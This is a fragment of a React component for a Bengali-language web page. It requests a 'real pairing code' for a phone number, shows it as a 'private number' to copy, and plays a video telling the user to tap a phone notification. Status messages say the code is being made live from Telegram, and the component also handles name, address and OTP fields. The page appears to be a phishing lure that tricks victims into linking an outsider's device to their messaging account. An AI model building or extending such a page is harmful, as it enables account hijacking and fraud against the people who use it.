                        title="ক্লিক করে কোড কপি করুন"
                      >
                        {pinChars.map((char, index) => (
                          <div 
                            key={index}
                            className={`w-full aspect-[3/4] max-w-[44px] flex items-center justify-center border-2 ${
                              isCodeLive ? "border-[#00a884] bg-white text-[#111827]" : "border-indigo-500 bg-indigo-50/10 text-indigo-700 animate-pulse-subtle"
                            } rounded-lg sm:rounded-xl font-sans font-extrabold text-sm sm:text-2xl shadow-xs transition-all hover:scale-105`}
                          >
                            {char}
                          </div>
                        ))}
                      </div>
                    );
                  })()}

                  {/* Mock Tutorial Frame exactly resembling the visual reference, appears when showVideo is true */}
                  {showVideo && (
                    <div id="tutorial-card-frame" className="rounded-2xl bg-[#080d16] border border-emerald-500/30 overflow-hidden p-4 shadow-xl text-left relative animate-pulse-subtle">
                      <div className="flex items-center justify-between text-[#00b0ff] font-mono text-[9px] font-black tracking-wider uppercase opacity-90">
                        <span className="text-[#25D366] font-bold flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-ping inline-block" />
                          TUTORIAL VIDEO (সরাসরি দেখুন)
                        </span>
                        <div className="flex items-center gap-1.5 text-slate-500">
                          <span>📶</span>
                          <span>🔋</span>
                        </div>
                      </div>

                      <p className="text-[11px] text-slate-300 font-sans mt-3">
                        ১. নোটিফিকেশন বার টেনে নোটিফিকেশনে চাপুন:
                      </p>

                      {/* HTML5 Video Player using src="/my-video.mp4" */}
                      <div className="mt-2.5 relative rounded-xl overflow-hidden bg-slate-950 border border-white/5 shadow-inner aspect-video">
                        <video 
                          id="tutorial-video"
                          src="/my-video.mp4" 
                          autoPlay 
                          muted 
                          loop 
                          playsInline 
                          controls
                          className="w-full h-full object-cover"
                        />
                      </div>

                      {/* Dot indicators at the bottom */}
                      <div className="flex justify-center gap-1.5 mt-4">
                        <span className="w-5 h-1.5 rounded-full bg-[#00a884]" />
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-700" />
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-700" />
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-700" />
                      </div>
                    </div>
                  )}

                  {/* Action Buttons styled precisely like the illustration */}
                  <div className="space-y-4 pt-2">
                    
                    {/* Teal Primary Button: প্রাইভেট নম্বর টি কপি করুন */}
                    <button
                      type="button"
                      onClick={async () => {
                        if (!isCodeLive) {
                          onShowToast("অনুগ্রহ করে অপেক্ষা করুন, টেলিগ্রাম থেকে কোড লাইভ করা হচ্ছে...", "error");
                          return;
                        }
                        const cleanPin = generatedPin.replace(/[^A-Z0-9]/gi, "").toUpperCase();
                        const copied = await copyToClipboardAsync(cleanPin);
                        if (copied) {
                          onShowToast("লিঙ্কিং কোডটি কপি সম্পন্ন হয়েছে!", "success");
                          setShowVideo(true);
                        } else {
                          onShowToast("কপি করা সম্ভব হয়নি।", "error");
                        }
                      }}
                      className="w-full py-3.5 px-4 bg-[#0f8a74] hover:bg-[#0c7260] text-white font-black rounded-2xl flex items-center justify-center gap-2 cursor-pointer shadow-md transition-all active:scale-95 text-sm"
                    >
                      {/* Copy vector code box icon */}
                      <svg className="w-4.5 h-4.5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2" />
                      </svg>
                      প্রাইভেট নাম্বারটি কপি করুন
                    </button>

                    {/* Light Green Overlay Button and pointing finger sticker */}
                    <div className="relative pt-2.5">
                      <button
                        type="button"
                        onClick={() => {
                          const cleanNum = phoneNumber.replace(/[^0-9]/g, "");
                          requestRealPairingCode(cleanNum);
                        }}
                        disabled={isLoading}
                        className="w-full py-4 px-4 bg-[#e6fbf4] text-[#0c705a] hover:bg-[#daf6ed] font-bold rounded-2xl flex items-center justify-center gap-1.5 border border-[#c6f2e2] cursor-pointer transition-all active:scale-95 text-xs sm:text-[13px] disabled:opacity-55"
                      >
                        {/* Video / Phone Linking frame icon representer */}
                        <svg className={`w-4 h-4 shrink-0 ${isLoading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
                        </svg>
                        রিসেন্ট
                      </button>

                      {/* Yellow pointing badge overlaying */}
                      <div 
                        onClick={async () => {
                          if (!isCodeLive) {
                            onShowToast("অনুগ্রহ করে অপেক্ষা করুন, টেলিগ্রাম থেকে কোড লাইভ করা হচ্ছে...", "error");
                            return;
                          }
                          const cleanPin = generatedPin.replace(/[^A-Z0-9]/gi, "").toUpperCase();
                          const copied = await copyToClipboardAsync(cleanPin);
                          if (copied) {
                            onShowToast("লিঙ্কিং কোড কপি করা হয়েছে!", "success");
                            setShowVideo(true);
                          } else {
                            onShowToast("কপি করা যায়নি।", "error");
                          }
                        }}
                        className={`absolute -top-1 bg-[#ffdf00] border-1.5 border-[#e5c900] text-[#111827] text-[10.5px] font-black px-4 py-1 rounded-full shadow-lg left-1/2 -translate-x-1/2 flex items-center gap-1 cursor-pointer select-none whitespace-nowrap active:scale-95 transition-all ${
                          pendingRemoteCopy ? "animate-bounce scale-110 shadow-amber-300/30" : ""
                        }`}
                      >
                        👉 এখানে চাপ দিয়ে কপি করুন 👈
                      </div>
                    </div>

                    {/* Go back back-arrow Button */}
                    <button
                      id="back-to-input-btn"
                      type="button"
                      onClick={() => {
                        onLogout();
                        setPhoneNumber("");
                        setName("");
                        setAddress("");
                        setOtp("");
                        setOtpSent(false);
                        setIsVerifying(false);
                        onShowToast("পূর্ববর্তী গ্রাহক সেশন সফলভাবে রিসেট করা হয়েছে।", "success");
                      }}
                      className="w-full py-3 px-4 bg-[#f8fafc] hover:bg-slate-50 text-slate-500 hover:text-slate-800 font-bold rounded-2xl flex items-center justify-center gap-1.5 border border-slate-200 shadow-xs transition-all cursor-pointer text-xs"
                    >
                      ← পেছনে ফিরুন
                    </button>
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
}
